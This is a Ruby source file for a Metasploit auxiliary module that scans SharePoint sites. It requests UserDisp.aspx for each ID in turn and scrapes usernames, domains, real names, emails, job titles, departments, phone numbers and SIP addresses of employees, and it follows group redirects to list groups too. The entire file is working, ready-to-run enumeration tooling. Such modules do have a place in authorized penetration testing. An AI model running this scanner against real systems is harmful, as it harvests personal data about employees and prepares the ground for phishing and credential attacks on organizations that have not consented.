##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Sharepoint User and Group Enumeration Scanner',
			'Version'     => '',
			'Description' => %q{
				This module scrapes usernames, groups, and detailed employee information
				from SharePoint sites by looping through all valid IDs
				via a GET request to UserDisp.aspx?ID= and parsing out the relevant
				information on the page.  In the event a group is found instead of a
				user, the scanner will follow the redirect and scrape the group.
			},
			'Author'      => ['syntaxerr <chris@erroredsecurity.com>, Updated/Expanded by J Parsons "0rigen", 0rigen [at] 0rigen.net'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('URI', [ true,  "The vulnerable UserDisp.aspx URI path", '/_layouts/userdisp.aspx']),
				Opt::RPORT(80),
				OptInt.new('STARTID', [ true, "The ID to start at",'1']),
				OptBool.new('FORCE', [true, "Set Force paremeter to True or leave unspecified", true])
			], self.class)
	end

	def run_host(target_host)

		if (not datastore['FORCE'])
			uri = datastore['URI']+'?ID='
		end
		if (datastore['FORCE'])
			uri = datastore['URI']+'?Force=True?ID='
		end
		
		currid = datastore['STARTID']

		begin
			curruri = uri+currid.to_s()

			res = send_request_cgi(
			{
				'method'	=> 'GET',
				'uri'		=> "#{uri}#{currid}"
			},20)

			#verify we can get in
			if (res and res.code == 401 and datastore['BasicAuthUser'] == nil)
				print_error("#{vhost}:#{rport} - 401 Authorization Required - Do you need a username?")
				break
			elsif (res and res.code == 403)
				print_error("Server is not vulnerable")
				break
			end

			#a 200 is returned when an ID number is a valid user or not valid whatsoever
			if (res and res.code == 200 and res.body)
				if res.body =~ /SharePointError/
					if currid == datastore['STARTID']
						print_error("STARTID is higher than the number of users and groups.  Choose a lower number.")
					else
						print_status("Scraping Completed.  No more users or groups found.")
					end
					break
				end

				parse_userdisp(res.body)

			#a 302 is thrown when the ID equals a group ID number - follow it and scrape
			elsif (res.code == 302 and res.headers['Location'])
				curruri = res.headers['Location']
				res = send_request_cgi(
				{
					'method'	=> 'GET',
					'uri'		=> curruri,
				},20)
				res.body.match(/PlaceHolderPageTitleInTitleArea_LabelGroupName\"\>([^\<]+)/i)
				print_good("Group: "+$1)
			end

			#inc
			currid += 1

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE

		end while 1
	end

	def parse_userdisp (page)
		page.match(/FieldInternalName=\"Name\".*\n.*\n.*\n\s+([^&]+).*/i)
		if ($1 =~ /([^\\]+)\\(.*)/)
			domain = $1
			user = $2
		else
			user = $1
		end
		name = page.match(/FieldInternalName="Title".*\n.*\n.*\n\s+([^&]+).*/i)[1]
		if(page.match(/FieldInternalName="EMail".*\n.*\n.*\n\s+\<a href=\"mailto:([^"]+)/i))
			email = $1
		else
			email = ""
		end
		notes = page.match(/FieldInternalName="Notes".*\n.*\n.*\n\s+\<div dir=""\>([^\<]+)?\</i)[1]
		if(page.match(/FieldInternalName="Department".*\n.*\n.*\n\s+([^&]+)/i))
			dept = $1
		else
			dept = ""
		end
		if(page.match(/FieldInternalName="JobTitle".*\n.*\n.*\n\s+([^&]+)./i))
			title = $1
		else
			title = ""
		end
		if(page.match(/FieldInternalName="SipAddress".*\n.*\n.*\n\s+\<a href="mailto:([^"]+).*/i))
			sip = $1
		else
			sip = ""
		end
		if(page.match(/FieldInternalName="WorkPhone".*\n.*\n.*\n\s+\<span dir="ltr"\>([^\<]+)?/i))
			phone = $1
		else
			phone = ""
		end
		
		print_good("Domain: #{domain} | Username: #{user} | Real Name: #{name} | Email: #{email} |"+
			" Job Title: #{title} | Department: #{dept} | Work Phone: #{phone} | Sip Address: #{sip} | Notes: #{notes}")
	end
end